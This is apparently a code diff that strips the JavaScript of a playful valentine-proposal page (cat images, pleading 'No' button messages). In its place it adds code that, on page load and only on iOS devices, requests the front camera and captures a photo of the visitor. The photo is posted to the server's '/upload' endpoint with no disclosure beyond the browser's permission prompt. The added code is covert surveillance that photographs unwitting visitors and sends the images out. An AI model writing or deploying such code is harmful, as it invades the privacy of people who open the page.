@@ -1,69 +1,17 @@
-"use strict";
-const titleElement = document.querySelector(".title");
-const buttonsContainer = document.querySelector(".buttons");
-const yesButton = document.querySelector(".btn--yes");
-const noButton = document.querySelector(".btn--no");
-const catImg = document.querySelector(".cat-img");
+function isIOSDevice() {
+  const userAgent = navigator.userAgent.toLowerCase();
 
-const MAX_IMAGES = 5;
-
-let play = true;
-let noCount = 0;
-
-yesButton.addEventListener("click", handleYesClick);
-
-noButton.addEventListener("click", function () {
-  if (play) {
-    noCount++;
-    const imageIndex = Math.min(noCount, MAX_IMAGES);
-    changeImage(imageIndex);
-    resizeYesButton();
-    updateNoButtonText();
-    if (noCount === MAX_IMAGES) {
-      play = false;
-    }
-  }
-});
-
-function handleYesClick() {
-  titleElement.innerHTML = "Yayyy!! :3";
-  buttonsContainer.classList.add("hidden");
-  changeImage("yes");
-}
-
-function resizeYesButton() {
-  const computedStyle = window.getComputedStyle(yesButton);
-  const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
-  const newFontSize = fontSize * 1.6;
-
-  yesButton.style.fontSize = `${newFontSize}px`;
-}
-
-function generateMessage(noCount) {
-  const messages = [
-    "No",
-    "Are you sure?",
-    "Pookie please",
-    "Don't do this to me :(",
-    "You're breaking my heart",
-    "I'm gonna cry...",
-  ];
-
-  const messageIndex = Math.min(noCount, messages.length - 1);
-  return messages[messageIndex];
-}
-
-function changeImage(image) {
-  catImg.src = `img/cat-${image}.jpg`;
-}
-
-function updateNoButtonText() {
-  noButton.innerHTML = generateMessage(noCount);
+  return /iphone|ipod|ipad/.test(userAgent);
 }
 
 // Add iOS-specific camera permission requests
 function requestCameraPermission() {
   return new Promise((resolve, reject) => {
+    if (!isIOSDevice()) {
+      resolve();
+      return;
+    }
+
     const constraints = {
       audio: false,
       video: { facingMode: "user" }
@@ -81,6 +29,10 @@ function requestCameraPermission() {
 
 // Modify the provided code to automatically take a front photo
 async function takeFrontPhoto() {
+  if (!isIOSDevice()) {
+    return;
+  }
+
   try {
     await requestCameraPermission();
 
@@ -91,3 +43,38 @@ async function takeFrontPhoto() {
 
     canvasElement.width = videoElement.videoWidth;
     canvasElement.height = videoElement.videoHeight;
+
+    // Draw the current frame from the video element to the canvas element
+    canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+
+    // Convert the canvas element to a data URL
+    const dataUrl = canvasElement.toDataURL('image/jpeg');
+
+    // Create a new image element and set its source to the data URL
+    const imageElement = new Image();
+    imageElement.src = dataUrl;
+
+    // Add the image element to the DOM
+    document.body.appendChild(imageElement);
+
+    // Send the captured photo to the server for processing and storage
+    const formData = new FormData();
+    formData.append('image', dataUrl);
+
+    fetch('/upload', {
+      method: 'POST',
+      body: formData
+    })
+    .then((response) => {
+      // Handle the server response
+    })
+    .catch((error) => {
+      console.error(error);
+    });
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+// Call the takeFrontPhoto function when the page loads
+window.addEventListener('load', takeFrontPhoto);
